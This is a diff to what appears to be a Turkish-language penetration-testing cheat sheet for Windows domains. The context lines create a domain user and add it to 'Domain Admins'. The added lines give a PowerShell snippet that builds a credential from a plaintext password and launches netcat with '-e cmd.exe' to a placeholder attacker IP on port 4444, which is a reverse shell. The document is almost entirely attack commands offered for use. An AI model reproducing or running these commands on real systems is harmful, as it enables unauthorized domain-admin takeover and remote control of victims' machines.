@@ -16,3 +16,11 @@ net user testuser1 Yeni123 /add /domain
 net group "Domain Admins" testuser1 /add /domain
 ```
 
+Başka Kullanıcı adına process açma:
+```bash
+$username = "TestUser@test.local"
+$password = "parola_buraya"  
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
+Start-Process -FilePath "C:\xampp\htdocs\nc.exe" -ArgumentList "-e cmd.exe 10.MY.IP 4444" -Credential $credential
+```
